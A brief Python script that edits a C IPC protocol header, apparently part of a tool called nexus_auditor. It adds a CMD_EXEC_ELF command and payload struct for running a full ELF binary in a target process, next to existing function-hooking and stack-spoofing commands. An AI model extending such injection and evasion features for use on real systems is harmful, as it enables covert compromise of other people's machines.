import re

with open('nexus_auditor/ipc_protocol.h', 'r') as f:
    content = f.read()

# Add CMD_EXEC_ELF payload struct
new_struct = """
/* CMD_EXEC_ELF payload */
typedef struct {
  pid_t target_pid;
  uint32_t elf_len;
  uint32_t args_len;
  uint8_t payload[]; /* args (null-terminated string) followed by ELF bytes */
} AEGIS_PACKED ipc_exec_elf_t;
"""

if "ipc_exec_elf_t" not in content:
    content = content.replace("/* CMD_HOOK_FUNCTION payload */", new_struct + "\n/* CMD_HOOK_FUNCTION payload */")

# Add CMD_EXEC_ELF to aegis_ipc_cmd_t
if "CMD_EXEC_ELF" not in content:
    content = content.replace("CMD_STACK_SPOOF      = 0x0D,  /* Stack frame spoofing activation        */", "CMD_STACK_SPOOF      = 0x0D,  /* Stack frame spoofing activation        */\n    CMD_EXEC_ELF         = 0x0E,  /* Execute full ELF with args             */")

with open('nexus_auditor/ipc_protocol.h', 'w') as f:
    f.write(content)

print("ipc_protocol.h updated successfully.")
